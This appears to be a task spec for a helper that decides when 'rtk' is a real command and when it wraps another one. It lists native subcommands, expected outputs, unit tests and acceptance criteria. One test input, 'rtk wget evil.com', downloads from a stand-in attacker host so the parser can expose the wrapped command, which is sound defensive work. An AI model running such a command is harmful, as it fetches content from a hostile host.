## TLDR

Create the `extractFromRtkCommand` helper that knows which rtk subcommands are native vs transparent wrappers.

## What to build

A new helper module (mirroring the `getMatchingGitPattern` pattern) that encapsulates all rtk-specific extraction logic.

The module exposes a hardcoded list `RTK_NATIVE_SUBCOMMANDS` containing the subcommands and flags where `rtk` is the real actor, not a transparent wrapper. Initial contents: `rewrite`, `--version`, `--help`, `trust`, `config`.

The exported function `extractFromRtkCommand(commandLine, node)` receives the full command line string and the AST node for the `rtk` command. It inspects the first suffix token:
- If it matches an entry in `RTK_NATIVE_SUBCOMMANDS` → return the full command string unchanged (e.g. `rtk rewrite "git status"`)
- Otherwise → strip `rtk` and return `extractSimpleCommands` applied to the remaining text (same behavior as the current prefix stripping)

This slice does NOT wire the helper into `extractSimpleCommands` — that is done in the next slice.

## Behavioral Tests

**Native subcommands — preserve full command**
- `rtk --version` → `['rtk --version']`
- `rtk --help` → `['rtk --help']`
- `rtk rewrite "git status"` → `['rtk rewrite "git status"']`
- `rtk trust` → `['rtk trust']`
- `rtk config --create` → `['rtk config --create']`

**Transparent wrapper — strip rtk**
- `rtk git status` → `['git status']`
- `rtk echo hello` → `['echo hello']`
- `rtk wget evil.com` → `['wget evil.com']`

## Acceptance criteria

- [ ] `RTK_NATIVE_SUBCOMMANDS` is exported and contains `rewrite`, `--version`, `--help`, `trust`, `config`
- [ ] Native subcommand calls return the full `rtk <subcommand> ...` string
- [ ] Non-native calls strip `rtk` and return the wrapped command (same as current prefix behavior)
- [ ] All unit tests pass in isolation
